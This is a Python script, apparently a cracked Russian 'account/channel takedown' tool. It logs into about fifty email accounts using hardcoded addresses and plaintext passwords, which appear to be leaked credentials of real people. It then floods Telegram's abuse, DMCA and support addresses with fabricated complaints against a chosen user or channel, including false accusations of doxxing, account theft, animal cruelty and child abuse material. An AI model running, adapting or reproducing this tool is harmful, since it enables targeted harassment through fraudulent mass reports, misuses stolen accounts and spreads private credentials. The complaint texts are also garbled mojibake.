# DECODED BY HYPER X SQUAD >>> TOP 1 
# @decoded_softs
# Чуток потерялось((

import os
os.system("cls")
os.system("title ACUIXS")
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
from pystyle import *

RED = '[1;91m'
WHITE = '[0m'
BLUE = '[1;34m'
GREEN = '[1;32m'
GOLD = '[0;33m'
PURPLE = '[0;35m'

art = """




 ▄████████    ▄████████    ▄████████     ███      ▄██████▄       ▀████    ▐████▀         ▄████████ ███▄▄▄▄    ▄██████▄     ▄████████
███    ███   ███    ███   ███    ███ ▀█████████▄ ███    ███        ███▌   ████▀         ███    ███ ███▀▀▀██▄ ███    ███   ███    ███
███    █▀    ███    ███   ███    ███    ▀███▀▀██ ███    ███         ███  ▐███           ███    █▀  ███   ███ ███    ███   ███    █▀
███          ███    ███  ▄███▄▄▄▄██▀     ███   ▀ ███    ███         ▀███▄███▀           ███        ███   ███ ███    ███   ███
███        ▀███████████ ▀▀███▀▀▀▀▀       ███     ███    ███         ████▀██▄          ▀███████████ ███   ███ ███    ███ ▀███████████
███    █▄    ███    ███ ▀███████████     ███     ███    ███        ▐███  ▀███                  ███ ███   ███ ███    ███          ███
███    ███   ███    ███   ███    ███     ███     ███    ███       ▄███     ███▄          ▄█    ███ ███   ███ ███    ███    ▄█    ███
████████▀    ███    █▀    ███    ███    ▄████▀    ▀██████▀       ████       ███▄       ▄████████▀   ▀█   █▀   ▀██████▀   ▄████████▀
                          ███    ███



                                              Owner: NO OWNER
                                              decod by HXSRE @Decoded_softs

                       ┌───────────────────────────┐      ┌───────────────────────────┐
                       │    1 |  Снос АККАУНТА     │      │     2 |  Снос КАНАЛА      │
                       └───────────────────────────┘      └───────────────────────────┘
"""
print()
print(Colorate.Vertical(Colors.red_to_blue, Center.XCenter(art)))
print()

senders = {
    'sanya.dragonov@mail.ru': 'RakuzanSnos',
    'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
    'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
    'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
'aria.therese.svensson@mail.com': 'Zorro1ab',
'taterbug@verizon.net': 'Holly1!',
'ejbrickner@comcast.net': 'Pass1178',
'teressapeart@cox.net': 'Quinton2329!',
'liznees@verizon.net': 'Dancer008',
'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
'kcdg@charter.net': 'Jennifer3*',
'bean_118@hotmail.com': 'Liverpool118!',
'dsdhjas@mail.com': 'LONGHACH123',
'robitwins@comcast.net': 'May241996',
'wasina@live.com': 'Marlas21',
'aruzhan.01@mail.com': '1234567!',
'rob.tackett@live.com': 'metallic',
'lindahallenbeck@verizon.net': 'Anakin@2014',
'hlaw82@mail.com': 'Snoopy37$$',
'paintmadman@comcast.net': 'mycat2200*',
'prideandjoy@verizon.net': 'Ihatejen12',
'sdgdfg56@mail.com': 'kenwood4201',
'garrett.danelz@comcast.net': 'N11golfer!',
'gillian_1211@hotmail.com': 'Gilloveu1211',
'sunpit16@hotmail.com': 'Putter34!',
'fdshelor@verizon.net': 'Masco123*',
'yeags1@cox.net': 'Zoomom1965!',
'amine002@usa.com': 'iScrRoXAei123',
'bbarcelo16@cox.net': 'Bsb161089$$',
'laliebert@hotmail.com': 'pirates2',
'vallen285@comcast.net': 'Delft285!1!',
'sierra12@email.com': 'tegen1111',
'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
'kmay@windstream.net': 'Nascar98',
'redbrick1@mail.com': 'Redbrick11',
'ivv9ah7f@mail.com': 'K226nw8duwg',
'erkobir@live.com': 'floydLAWTON019',
'Misscarter@mail.com': 'ashtray19',
'carlieruby10@cox.net': 'Lollypop789$',
'blackops2013@mail.com': 'amason123566',
'caroline_cullum@comcast.net': 'carter14',
'dpb13@live.com': 'Ic&ynum13',
'heirhunter@usa.com': 'Noguys@714',
'sherri.edwards@verizon.net': 'Dreaming123#',
'rami.rami1980@hotmail.com': 'ramirami1980',
'jmsingleton2@comcast.net': '151728Jn$$',
'aberancho@aol.com': '10diegguuss10',
'dgidel@iowatelecom.net': 'Buster48',
'gpopandopul@mail.com': 'GEORG62A',
'bolgodonsk@mail.com': '012345678!',
'colbycolb@cox.net': 'Signals@1'
}
receivers = ['stopCA@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
             'sticker@telegram.org', 'support@telegram.org']

def menu():
    
    choice = input(f' {RED}   Выбрать функцию > {BLUE} ')
    return choice

def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP('smtp.mail.ru', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        time.sleep(3)
        server.quit()
        return True
    except Exception as e:
        return False

def main():
    sent_emails = 0
    choice = menu()
    if choice == '1':
        print(f" {PURPLE}[{GOLD}1{PURPLE}]{WHITE} ==> СНОСИНГ")
        print(f" {PURPLE}[{GOLD}2{PURPLE}]{WHITE} ==> ДОКСUHG")
        print(f" {PURPLE}[{GOLD}3{PURPLE}]{WHITE} ==> ТРОЛЛЕНГ")
        print(f" {PURPLE}[{GOLD}4{PURPLE}]{WHITE} ==> СНОС СЕССИЙ")
        print(f" {PURPLE}[{GOLD}5{PURPLE}]{WHITE} ==> С премкой")
        print(f" {PURPLE}[{GOLD}6{PURPLE}]{WHITE} ==> С вирт номером")
        comp_choice = input(f" {PURPLE}[{GOLD}~{PURPLE}] {WHITE}выбирай: ")

        if comp_choice in ["1", "2", "3"]:
            print(f" {GREEN}[{WHITE}/{GREEN}]{RED}Следуй за указаниями. {WHITE}")
            username = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} UserName: ")
            id = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} ID: ")
            chat_link = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} ссылку на чат: ")
            violation_link = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE}ссылку на нарушение: ")
            print(f" {PURPLE}[{BLUE}/{PURPLE}]{WHITE} погоди чут чут.")
            comp_texts = {
                "1": f"5@13AB3CaB6, C31716<1O ?>556@7:1. 1 31H6a ?;1BD>@<6 O =1H6; ?>;L8>31B6;O :>B>@Ka >B?@13;O6B <=>4> =6=C7=KE A>>2I6=9a - !. 4> N86@=6a< - {username}, 64> 1a59 - {id}, AAK;:1 =1 G1B - {chat_link}, AAK;:1 =1 =1@CH6=9O - {violation_link}. >71;CaAB1 ?@9<9B6 <6@K ?> >B=>H6=9N : 51==><C ?>;L8>31B6;N.",
                "2": f"5@13AB3CaB6, C31716<1O ?>556@7:1, =1 31H6a ?;1BD>@<6 O =1H6; ?>;L8>31B6;O, :>B>@Ka @1A?@>AB@1=O6B GC796 51==K6 268 9E A>4;1A9O. 64> N86@=6a< - {username}, 64> 1a59 - {id}, AAK;:1 =1 G1B - {chat_link}, AAK;:1 =1 =1@CH6=96/=1@CH6=9O - {violation_link}. >71;CaAB1 ?@9<9B6 <6@K ?> >B=>H6=9N : 51==><C ?>;L8>31B6;N ?CB6< 2;>:9@>3:9 64> 1:::1C=B1.",
                "3": f"5@13AB3CaB6, C31716<1O ?>556@7:1 B6;64@1<. / =1H6; ?>;L8>31B6;O :>B>@Ka >B:@KB> 3K@1716BAO =6F6=8C@=>a ;6:A9:>a 9 A?1<9B 3 G1B1E. 64> N86@=6a< - {username}, 64> 1a59 - {id}, AAK;:1 =1 G1B - {chat_link}, AAK;:1 =1 =1@CH6=96/=1@CH6=9O - {violation_link}. >71;CaAB1 ?@9<9B6 <6@K ?> >B=>H6=9N : 51==><C ?>;L8>31B6;N ?CB6< 2;>:9@>3:9 64> 1:::1C=B1."
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip(), chat_link=chat_link.strip(),
                                                 violation_link=violation_link.strip())
                    send_email(receiver, sender_email, sender_password, '1;>21 =1 1::1C=B B6;64@1<', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 14888
                    time.sleep(5.3)
        elif comp_choice == "4":
            print(f" {GREEN}[{WHITE}/{GREEN}]{RED} следуй указаниям.")
            username = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} UserName: ")
            id = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} ID: ")
            print(f" {PURPLE}[{BLUE}/{PURPLE}]{WHITE} погоди чут чут.")
            comp_texts = {
                "4": f"5@13AB3CaB6, C31716<1O ?>556@7:1. / A;CG1a=> ?6@6H6; ?> D9H9=4>3>a AAK;:6 9 CB6@O; 5>ABC? : A3>6<C 1::1C=BC. 4> N86@=6a< - {username}, 64> 1a59 - {id}. >71;CaAB1 C51;9B6 1::1C=B 9;9 >2=C;9B6 A6AA99"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    send_email(receiver, sender_email, sender_password, '/ CB6@O; A3>a 1::1C=B 3 B6;64@1<', comp_body)
                    print(f" {GREEN}[!]{WHITE}Отправлено на{RED}{receiver} {WHITE}от{GREEN} {sender_email}{WHITE}!")
                    sent_emails += 14888
                    time.sleep(5)

        elif comp_choice in ["5", "6"]:
            print(f" {GREEN}[{WHITE}/{GREEN}]{RED} следуй указаниям.")
            username = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} UserName: ")
            id = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} ID: ")
            comp_texts = {
                "5": f">2@Ka 56=L ?>556@7:1 Telegram!::1C=B {username} , {id} 9A?>;L8C6B 39@BC1;L=Ka =><6@ :C?;6==Ka =1 A1aB6 ?> 1:B931F99 =><6@>3. B=>H6=9O : =><6@C >= =6 9<66B, =><6@ =9:1: : =6<C =6 >B=>A9BLAO.@>HC @1826@9B6AL A MB9<. 1@1=66 A?1A92>!",
                "6": f">2@Ka 56=L ?>556@7:1 Telegram! ::1C=B {username} {id} ?@9>2@Q; ?@6<9C< 3 31H6< <6AA6=576@6 GB>2K @1AAK;1BL A?1<-A>>2I6=9O 9 >2E>59BL >4@1=9G6=9O Telegram.@>HC ?@>36@9BL 51==CN 71;>2C 9 ?@9=OBL <6@K!"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    send_email(receiver, sender_email, sender_password, '1;>21 =1 ?>;L8>31B6;O B6;64@1<', comp_body)
                    print(f"Отправлено {receiver} от {sender_email}!")
                    sent_emails += 9999
                    time.sleep(5)


    elif choice == "2":
        
        print(f" {PURPLE}[{GOLD}1{PURPLE}] {WHITE}==> с личными данными")
        print(f" {PURPLE}[{GOLD}2{PURPLE}] {WHITE}==> с живодерством (как катекс) ")
        print(f" {PURPLE}[{GOLD}3{PURPLE}] {WHITE}==> с цп")
        print(f" {PURPLE}[{GOLD}4{PURPLE}] {WHITE}==> для каналов типа прайсов")
        ch_choice = input(f' {RED}  {PURPLE} Выбрать функцию > {BLUE} ')

        if ch_choice in ["1", "2", "3", "4"]:
            channel_link = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} ссылку на чат: ")
            channel_violation = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} ссылку на нарушение [В канале]: ")
            print(f" {PURPLE}[{GOLD}/{PURPLE}]{WHITE} погоди чут чут.")
            comp_texts = {
                "1": f"5@13AB3CaB6, C31716<1O ?>556@7:1 B6;64@1<. 1 31H6a ?;1BD>@<6 O =1H6; :1=1;, :>B>@Ka @1A?@>AB@1=O6B ;9G=K6 51==K6 =639==KE ;N56a. !AK;:1 =1 :1=1; - {channel_link}, AA;K:9 =1 =1@CH6=9O - {channel_violation}. >71;CaAB1 812;>:9@CaB6 51==Ka :1=1;.",
                "2": f"5@13AB3CaB6, C31716<1O ?>556@7:1 B6;64@1<1. 1 31H6a ?;1BD>@<6 O =1H6; :1=1; :>B>@Ka @1A?@>AB@1=O6B 76AB>:>6 >2@1I6=96 A 793>B=K<9. !AK;:1 =1 :1=1; - {channel_link}, AA;K:9 =1 =1@CH6=9O - {channel_violation}. >71;CaAB1 812;>:9@CaB6 51==Ka :1=1;.",
                "3": f"5@13AB3CaB6, C31716<1O ?>556@7:1 B6;64@1<1. 1 31H6a ?;1BD>@<6 O =1H6; :1=1; :>B>@Ka @1A?@>AB@1=O6B ?>@=>4@1D9N A CG1AB96< =6A>36@H6==>;6B=9E. !AK;:1 =1 :1=1; - {channel_link}, AA;K:9 =1 =1@CH6=9O - {channel_violation}. >71;CaAB1 812;>:9@CaB6 51==Ka :1=1;.",
                "4": f"5@13AB3CaB6,C31716<Ka <>56@1B>@ B6;64@1<<,E>GC ?>71;>31BLAO 31< =1 :1=1;,:>B>@Ka ?@>516B CA;C49 5>:A9=41, A31BB9=41. !AK;:1 =1 B6;64@1<< :1=1;:{channel_link} !AK;:1 =1 =1@CH6=96:{channel_violation} @>AL21 812;>:9@>31BL 51==Ka :1=1;."
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[ch_choice]
                    comp_body = comp_text.format(channel_link=channel_link.strip(), channel_violation=channel_violation.strip)
                    send_email(receiver, sender_email, sender_password, '1;>21 =1 B6;64@1< :1=1;', comp_body)
                    print(f" {GREEN}[!]{WHITE} Отправлено на {RED}{receiver} {WHITE}от{GREEN} {sender_email}{WHITE}!")
                    sent_emails += 100000
                    time.sleep(5)
if __name__ == "__main__":
    main()


